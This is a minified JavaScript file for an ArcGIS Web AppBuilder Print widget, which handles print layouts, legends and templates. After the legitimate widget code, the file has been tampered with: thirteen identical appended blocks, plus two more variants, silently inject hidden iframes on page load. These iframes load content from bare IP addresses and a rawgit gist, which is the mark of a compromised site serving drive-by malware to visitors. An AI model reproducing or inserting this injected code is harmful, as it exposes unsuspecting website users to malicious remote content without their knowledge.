// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Print/templates/Print.html":'\x3cdiv class\x3d"gis_PrintDijit"\x3e\r\n    \x3cdiv class\x3d"formContainer"\x3e\r\n        \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"printSettingsFormDijit"\x3e\r\n            \x3ctable cellspacing\x3d"5" style\x3d"width:100%;"\x3e\r\n                \x3ctr data-dojo-attach-point\x3d"titleTr"\x3e\r\n                    \x3ctd style\x3d"width:65px;"\x3e\r\n                        ${nls.title}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"text" data-dojo-attach-point\x3d"titleNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"name:\'title\',trim:true,required:true,style:\'width:100%;\'" /\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr style\x3d"display: none"\x3e\r\n                    \x3ctd\x3e\r\n                        ${nls.layout}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"select" data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d"name:\'layout\',style:\'width:100%;\'"\r\n                        data-dojo-attach-point\x3d"layoutDijit" data-dojo-attach-event\x3d"Change:onLayoutChange"/\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr style\x3d"display: none"\x3e\r\n                    \x3ctd\x3e\r\n                        ${nls.format}:\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cinput type\x3d"select" data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d"name:\'format\',style:\'width:100%;\'"\r\n                        data-dojo-attach-point\x3d"formatDijit" /\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n            \x3c/table\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"buttonActionBar jimu-align-trailing"\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"advancedButtonDijit" style\x3d"display: none"\r\n            data-dojo-attach-event\x3d"onclick:showSettings"\x3e\x3cdiv class\x3d"btn-icon settingsIcon"\x3e\x3c/div\x3e${nls.settings}\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"dijit/TooltipDialog" data-dojo-attach-point\x3d"settingsDialog"\r\n            style\x3d"display: none" class\x3d"gis_PrintDijit"\x3e\r\n            \x3cdiv style\x3d"width:250px;"\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapScaleExtent}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"preserveFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd style\x3d"vertical-align:middle;"\x3e\r\n                                ${nls.preserve}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"radio" data-dojo-attach-point\x3d"printWidgetMapScale" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',checked:true,value:\'true\'"\r\n                                /\x3e\x3clabel data-dojo-attach-point\x3d"printWidgetMapScaleLabel"\x3e${nls.mapScale}\x3c/label\x3e\r\n                                \x3cbr /\x3e\r\n                                \x3cinput type\x3d"radio" data-dojo-attach-point\x3d"printWidgetMapExtent" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',value:\'false\'"\r\n                                /\x3e\x3clabel data-dojo-attach-point\x3d"printWidgetMapExtentLabel"\x3e${nls.mapExtent}\x3c/label\x3e\r\n                            \x3c/td\x3e\r\n                            \x3ctr\x3e\r\n                                \x3ctd\x3e\r\n                                    ${nls.forceScale}:\r\n                                \x3c/td\x3e\r\n                                \x3ctd\x3e\r\n                                    \x3cinput type\x3d"radio" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-props\x3d"name:\'preserveScale\',value:\'force\',checked:false"/\x3e \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'forcedScale\',required:false,style:\'width:100px;\'" data-dojo-attach-point\x3d"forceScaleNTB"/\x3e \x3ca href\x3d"#" data-dojo-attach-event\x3d"click:getCurrentMapScale"\x3e${nls.getCurrentScale}\x3c/a\x3e\r\n                                \x3c/td\x3e\r\n                            \x3c/tr\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;" data-dojo-attach-point\x3d"labelsTitleNode"\x3e\r\n                    ${nls.labels}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"labelsFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd style\x3d"vertical-align:middle;"\x3e\r\n                                ${nls.showLabels}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-props\x3d"name:\'showLabels\',value:true,checked:true" /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapMetadata}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"layoutMetadataDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5" style\x3d"width:100%;"\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"authorTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.author}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-attach-point\x3d"authorNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"name:\'author\',trim:true,required:false,style:\'width:100%;\'" data-dojo-attach-point\x3d"authorTB"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"copyrightTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.copyright}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3ctextarea data-dojo-attach-point\x3d"copyrightNode" name\x3d"copyright"\r\n                                    data-dojo-type\x3d"dijit/form/SimpleTextarea"\r\n                                    style\x3d"width:100%;height:60px;resize:none;"\x3e\x3c/textarea\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"customTextElementsDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5" style\x3d"width:100%;" data-dojo-attach-point\x3d"customTextElementsTable"\x3e\r\n\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"layoutFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr data-dojo-attach-point\x3d"legendTr"\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.lncludeLegend}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"checkbox" data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-props\x3d"name:\'legend\',value:true,checked:true"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.mapOnlyOptions}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"mapOnlyFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.width}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'width\',required:true,value:670,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.height}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'height\',required:true,value:500,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv style\x3d"font-weight:bold;"\x3e\r\n                    ${nls.printQualityOptions}:\r\n                \x3c/div\x3e\r\n                \x3cdiv data-dojo-type\x3d"dijit/form/Form" data-dojo-attach-point\x3d"mapQualityFormDijit"\x3e\r\n                    \x3ctable cellspacing\x3d"5"\x3e\r\n                        \x3ctr\x3e\r\n                            \x3ctd\x3e\r\n                                ${nls.dpi}:\r\n                            \x3c/td\x3e\r\n                            \x3ctd\x3e\r\n                                \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"name:\'dpi\',required:true,value:96,style:\'width:100px;\'"\r\n                                /\x3e\r\n                            \x3c/td\x3e\r\n                        \x3c/tr\x3e\r\n                    \x3c/table\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"printButtonDijit"\r\n            data-dojo-attach-event\x3d"onclick:print"\x3e\x3cdiv class\x3d"btn-icon printIcon"\x3e\x3c/div\x3e${nls.print}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- \x3chr calss\x3d"spacer"\x3e --\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"printResultsNode" class\x3d"resultsContainer"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"clearActionBarNode" class\x3d"buttonActionBar"\r\n    style\x3d"display:none;padding:0;"\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-event\x3d"onclick:clearResults"\x3e\r\n            \x3cdiv class\x3d"btn-icon clearIcon"\x3e\x3c/div\x3e${nls.clearList}\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Print/templates/PrintResult.html":'\x3cdiv class\x3d"printResult" data-dojo-attach-point\x3d"resultNode" data-dojo-attach-event\x3d"onclick:_openPrint"\x3e\r\n  \x3ctable class\x3d"printResultTable"\x3e\r\n    \x3ctr\x3e\r\n      \x3ctd width\x3d"25px"\x3e\r\n        \x3cspan class\x3d"bold"\x3e${count}.\x3c/span\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd width\x3d"30px"\x3e\r\n        \x3cimg src\x3d"${icon}"\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd data-dojo-attach-point\x3d"nameNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"progressBar" data-dojo-type\x3d"dijit/ProgressBar" data-dojo-props\x3d\'value:Infinity\'\x3e\x3c/div\x3e\r\n        \x3cspan data-dojo-attach-point\x3d"successNode" class\x3d"bold" style\x3d"display:none;"\x3e${docName}\x3c/span\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"errNode" style\x3d"display:none;"\x3e\r\n          \x3cspan class\x3d"bold"\x3e${nls.printError}\x3c/span\x3e\r\n          \x3cdiv class\x3d"jimu-icon jimu-icon-error jimu-float-trailing"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/td\x3e\r\n    \x3c/tr\x3e\r\n  \x3c/table\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin esri/tasks/PrintTask esri/tasks/PrintParameters esri/tasks/PrintTemplate esri/request esri/lang esri/arcgis/utils dojo/_base/config dojo/_base/lang dojo/_base/array dojo/_base/html dojo/dom-style dojo/dom-construct dojo/dom-class dojo/promise/all dojo/Deferred jimu/portalUrlUtils dojo/text!./templates/Print.html dojo/text!./templates/PrintResult.html dojo/aspect dojo/query jimu/LayerInfos/LayerInfos jimu/dijit/LoadingShelter jimu/dijit/Message jimu/utils dojo/on dijit/popup dijit/form/ValidationTextBox dijit/form/Form dijit/form/Select dijit/form/NumberTextBox dijit/form/Button dijit/form/CheckBox dijit/ProgressBar dijit/form/DropDownButton dijit/TooltipDialog dijit/form/RadioButton dijit/form/SimpleTextarea esri/IdentityManager dojo/store/Memory".split(" "),
function(t,u,v,w,E,F,G,x,H,y,I,d,e,b,l,J,z,K,A,B,n,L,q,C,M,N,O,D,P,r,Q){n=t([u,v,w],{widgetsInTemplate:!0,templateString:n,map:null,count:1,results:[],authorText:null,copyrightText:null,defaultTitle:null,defaultFormat:null,defaultLayout:null,baseClass:"gis_PrintDijit",pdfIcon:require.toUrl("./widgets/Print/images/pdf.png"),imageIcon:require.toUrl("./widgets/Print/images/image.png"),printTaskURL:null,printTask:null,async:!1,_showSettings:!1,_currentTemplateInfo:null,postCreate:function(){this.inherited(arguments);
this.printTask=new E(this.printTaskURL,{async:this.async});this.printparams=new F;this.printparams.map=this.map;this.shelter=new N({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();this.shelter.show();this.titleNode.set("value",this.defaultTitle);this.authorNode.set("value",this.defaultAuthor);this.copyrightNode.set("value",this.defaultCopyright);var a=B.setHttpProtocol(this.printTaskURL),f=B.getNewPrintUrl(this.appConfig.portalUrl);this._isNewPrintUrl=a===f||/sharing\/tools\/newPrint$/.test(a);
a=C("input",this.printWidgetMapScale.domNode)[0];f=C("input",this.printWidgetMapExtent.domNode)[0];D.combineRadioCheckBoxWithLabel(a,this.printWidgetMapScaleLabel);D.combineRadioCheckBoxWithLabel(f,this.printWidgetMapExtentLabel);"MAP_ONLY"===this.defaultLayout?b.setStyle(this.titleTr,"display","none"):b.setStyle(this.titleTr,"display","");this._hasLabelLayer()?(b.setStyle(this.labelsFormDijit.domNode,"display",""),b.setStyle(this.labelsTitleNode,"display","")):(b.setStyle(this.labelsFormDijit.domNode,
"display","none"),b.setStyle(this.labelsTitleNode,"display","none"));M.getInstance(this.map,this.map.itemInfo).then(d.hitch(this,function(a){this.layerInfosObj=a;return K([this._getPrintTaskInfo(),this._getLayerTemplatesInfo()]).then(d.hitch(this,function(a){var c=a[0];(a=a[1])&&!a.error?(a=a&&a.results)&&0<a.length&&(e.some(a,d.hitch(this,function(a){return a&&"Output_JSON"===a.paramName?this.templateInfos=a.value:!1})),this.templateInfos&&0<this.templateInfos.length&&(this.templateNames=e.map(this.templateInfos,
function(a){return a.layoutTemplate}))):console.warn("Get Layout Templates Info Error",a&&a.error);!H.isDefined(c)||c&&c.error?this._handleError(c.error):this._handlePrintInfo(c)}))})).always(d.hitch(this,function(){this.shelter.hide()}));this.printTask._getPrintDefinition&&q.after(this.printTask,"_getPrintDefinition",d.hitch(this,"printDefInspector"),!1);this.printTask._createOperationalLayers&&(q.after(this.printTask,"_createOperationalLayers",d.hitch(this,"_fixInvalidSymbol")),q.after(this.printTask,
"_createOperationalLayers",d.hitch(this,"_excludeInvalidLegend")))},_hasLabelLayer:function(){return e.some(this.map.graphicsLayerIds,function(a){return(a=this.map.getLayer(a))&&"esri.layers.LabelLayer"===a.declaredClass},this)},_getPrintTaskInfo:function(){var a=new A;this._isNewPrintUrl?a.resolve({isGPPrint:!1}):x({url:this.printTaskURL,content:{f:"json"},callbackParamName:"callback",handleAs:"json",timeout:6E4}).then(d.hitch(this,function(f){a.resolve({isGPPrint:!0,data:f})}),d.hitch(this,function(f){a.resolve({error:f})}));
return a},_getLayerTemplatesInfo:function(){var a=new A,f=this.printTaskURL.split("/"),b=f.indexOf("GPServer");if(-1<b){var c=null,c=/Utilities\/PrintingTools\/GPServer/.test(this.printTaskURL)?f.slice(0,b+1).join("/")+"/"+encodeURIComponent("Get Layout Templates Info Task")+"/execute":f.slice(0,b+1).join("/")+"/"+encodeURIComponent("Get Layout Templates Info")+"/execute";x({url:c,content:{f:"json"},callbackParamName:"callback",handleAs:"json",timeout:6E4}).then(d.hitch(this,function(c){a.resolve(c)}),
d.hitch(this,function(c){a.resolve({error:c})}))}else a.resolve(null);return a},_fixInvalidSymbol:function(a){e.forEach(a,function(a){"map_graphics"===a.id&&(a=d.getObject("featureCollection.layers",!1,a))&&0<a.length&&e.forEach(a,function(a){a&&a.featureSet&&"esriGeometryPoint"===a.featureSet.geometryType&&e.forEach(a.featureSet.features,function(a){a&&a.symbol&&!a.symbol.style&&(a.symbol.style="esriSMSSquare")})})},this);return a},_excludeInvalidLegend:function(a){function b(a){return e.filter(a.subLayerIds,
d.hitch(this,function(c){return(c=this.layerInfosObj.getLayerInfoById(a.id+"_"+c))&&c.getShowLegendOfWebmap()}))}if(this.printTask.allLayerslegend){for(var g=y.getLegendLayers({map:this.map,itemInfo:this.map.itemInfo}),g=e.map(g,function(a){return{id:a.layer.id}}),c=this.printTask.allLayerslegend,p=[],h=0;h<c.length;h++){var k=c[h],m=this.map.getLayer(k.id),l=this.layerInfosObj.getLayerInfoById(k.id),n=m&&m.declaredClass&&"esri.layers.GraphicsLayer"!==m.declaredClass,m=!m.renderer||m.renderer&&!m.renderer.hasVisualVariables(),
l=l&&l.getShowLegendOfWebmap();n&&m&&l&&(k.subLayerIds&&(k.subLayerIds=d.hitch(this,b,k)()),p.push(k))}e.forEach(g,d.hitch(this,function(a){var c=e.some(p,d.hitch(this,function(c){return c.id===a.id})),b=this.layerInfosObj.getLayerInfoById(a.id),b=b&&b.getShowLegendOfWebmap()&&b.isShowInMap();!c&&b&&p.push(a)}));this.printTask.allLayerslegend=p}return a},printDefInspector:function(a){"force"===this.preserve.preserveScale&&(a.mapOptions.scale=this.preserve.forcedScale);return a},_handleError:function(a){console.log("print widget load error: ",
a);new O({message:a.message||a})},onLayoutChange:function(a){var f=this.templateNames&&this.templateNames.indexOf(a);if(-1<f){b.empty(this.customTextElementsTable);a=this._currentTemplateInfo=this.templateInfos[f];if((f=d.getObject("layoutOptions.customTextElements",!1,a))&&0<f.length){var g=[];e.forEach(f,d.hitch(this,function(a){for(var c in a)if(0>g.indexOf(c)){var d=this.customTextElementsTable.insertRow(-1);d.insertCell(-1).appendChild(b.toDom(c+": "));d.insertCell(-1).appendChild((new Q({name:c,
trim:!0,required:!1,value:a[c],style:"width:100%"})).domNode);g.push(c)}}))}d.getObject("layoutOptions.hasAuthorText",!1,a)?b.setStyle(this.authorTr,"display",""):b.setStyle(this.authorTr,"display","none");d.getObject("layoutOptions.hasCopyrightText",!1,a)?b.setStyle(this.copyrightTr,"display",""):b.setStyle(this.copyrightTr,"display","none");d.getObject("layoutOptions.hasTitleText",!1,a)?b.setStyle(this.titleTr,"display",""):b.setStyle(this.titleTr,"display","none");d.getObject("layoutOptions.hasLegend",
!1,a)?b.setStyle(this.legendTr,"display",""):b.setStyle(this.legendTr,"display","none")}else"MAP_ONLY"===a?(b.setStyle(this.authorTr,"display","none"),b.setStyle(this.copyrightTr,"display","none"),b.setStyle(this.titleTr,"display","none"),b.setStyle(this.legendTr,"display","none"),this._currentTemplateInfo={layoutOptions:{hasTitleText:!1,hasCopyrightText:!1,hasAuthorText:!1,hasLegend:!1}}):(b.setStyle(this.authorTr,"display",""),b.setStyle(this.copyrightTr,"display",""),b.setStyle(this.titleTr,"display",
""),b.setStyle(this.legendTr,"display",""),this._currentTemplateInfo={layoutOptions:{hasTitleText:!0,hasCopyrightText:!0,hasAuthorText:!0,hasLegend:!0}})},_getMapAttribution:function(){var a=this.map.attribution;return a&&a.domNode?b.getProp(a.domNode,"textContent"):""},showSettings:function(a){a.preventDefault();a.stopPropagation();this._showSettings?(r.close(this.settingsDialog),this._showSettings=!1):(r.open({popup:this.settingsDialog,around:this.advancedButtonDijit}),this._showSettings=!0)},_handlePrintInfo:function(a){if(a.isGPPrint){a=
a.data;l.set(this.layoutDijit.domNode.parentNode.parentNode,"display","");l.set(this.formatDijit.domNode.parentNode.parentNode,"display","");l.set(this.advancedButtonDijit,"display","");this.own(P(document.body,"click",d.hitch(this,function(a){if(this._showSettings){a=a.target||a.srcElement;var c=this.settingsDialog.domNode;a===c||b.isDescendant(a,c)||(r.close(this.settingsDialog),this._showSettings=!1)}})));var f=e.filter(a.parameters,function(a){return"Layout_Template"===a.name});if(0===f.length)console.log('print service parameters name for templates must be "Layout_Template"');
else{var g=e.map(f[0].choiceList,function(a){return{label:a,value:a}});g.sort(function(a,b){return a.label>b.label?1:b.label>a.label?-1:0});this.layoutDijit.addOption(g);this.defaultLayout?this.layoutDijit.set("value",this.defaultLayout):this.layoutDijit.set("value",f[0].defaultValue);a=e.filter(a.parameters,function(a){return"Format"===a.name});0===a.length?console.log('print service parameters name for format must be "Format"'):(f=e.map(a[0].choiceList,function(a){return{label:a,value:a}}),f.sort(function(a,
b){return a.label>b.label?1:b.label>a.label?-1:0}),this.formatDijit.addOption(f),this.defaultFormat?this.formatDijit.set("value",this.defaultFormat):this.formatDijit.set("value",a[0].defaultValue))}}else l.set(this.layoutDijit.domNode.parentNode.parentNode,"display","none"),l.set(this.formatDijit.domNode.parentNode.parentNode,"display","none"),l.set(this.advancedButtonDijit,"display","none")},print:function(){if(this.printSettingsFormDijit.isValid()){var a=this.printSettingsFormDijit.get("value");
d.mixin(a,this.layoutMetadataDijit.get("value"));d.mixin(a,this.labelsFormDijit.get("value"));this.preserve=this.preserveFormDijit.get("value");d.mixin(a,this.preserve);this.layoutForm=this.layoutFormDijit.get("value");var b=this.mapQualityFormDijit.get("value"),g=this.mapOnlyFormDijit.get("value");d.mixin(g,b);var c=this.customTextElementsDijit.get("value"),b=[],e=!1,h=I.locale||"en",k;for(k in c){var m={};"Date"===k?(m[k]=(new Date).toLocaleString(h),e=!0):m[k]=c[k];b.push(m)}e||b.push({Date:(new Date).toLocaleString(h)});
e=this._currentTemplateInfo;k=d.getObject("layoutOptions.hasAuthorText",!1,e);c=d.getObject("layoutOptions.hasCopyrightText",!1,e);e=d.getObject("layoutOptions.hasTitleText",!1,e);h=new G;h.format=a.format;h.layout=a.layout;h.preserveScale="true"===a.preserveScale||"force"===a.preserveScale;h.label=a.title;h.exportOptions=g;h.showLabels=a.showLabels&&a.showLabels[0];h.layoutOptions={authorText:k?a.author:"",copyrightText:c?a.copyright||this._getMapAttribution():"",legendLayers:this._getLegendLayers(),
titleText:e?a.title:"",customTextElements:b};this.printparams.template=h;this.printparams.extraParameters={printFlag:!0};g=this.printTask.execute(this.printparams);(new R({count:this.count.toString(),icon:"PDF"===a.format?this.pdfIcon:this.imageIcon,docName:a.title,title:a.format+", "+a.layout,fileHandle:g,nls:this.nls})).placeAt(this.printResultsNode,"last").startup();l.set(this.clearActionBarNode,"display","block");this.count++}else this.printSettingsFormDijit.validate()},_getLegendLayers:function(){var a=
d.getObject("layoutOptions.hasLegend",!1,this._currentTemplateInfo),b=0<this.layoutForm.legend.length&&this.layoutForm.legend[0];if(this.printTask&&!this.printTask._createOperationalLayers){var g=[];a&&b&&(a=y.getLegendLayers({map:this.map,itemInfo:this.map.itemInfo}),g=e.map(a,function(a){return{layerId:a.layer.id}}));return g}return a&&b?null:[]},clearResults:function(){J.empty(this.printResultsNode);l.set(this.clearActionBarNode,"display","none");this.count=1},updateAuthor:function(a){(a=a||"")&&
this.authorTB&&this.authorTB.set("value",a)},getCurrentMapScale:function(){this.forceScaleNTB.set("value",this.map.getScale())}});var R=t([u,v,w],{widgetsInTemplate:!0,templateString:L,url:null,postCreate:function(){this.inherited(arguments);this.progressBar.set("label",this.nls.creatingPrint);this.fileHandle.then(d.hitch(this,"_onPrintComplete"),d.hitch(this,"_onPrintError"))},_onPrintComplete:function(a){a.url?(this.url=a.url,b.setStyle(this.progressBar.domNode,"display","none"),b.setStyle(this.successNode,
"display","inline-block"),z.add(this.resultNode,"printResultHover")):this._onPrintError(this.nls.printError)},_onPrintError:function(a){console.log(a);b.setStyle(this.progressBar.domNode,"display","none");b.setStyle(this.errNode,"display","block");z.add(this.resultNode,"printResultError");b.setAttr(this.domNode,"title",a.details||a.message||"")},_openPrint:function(){null!==this.url&&window.open(this.url)}});return n});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});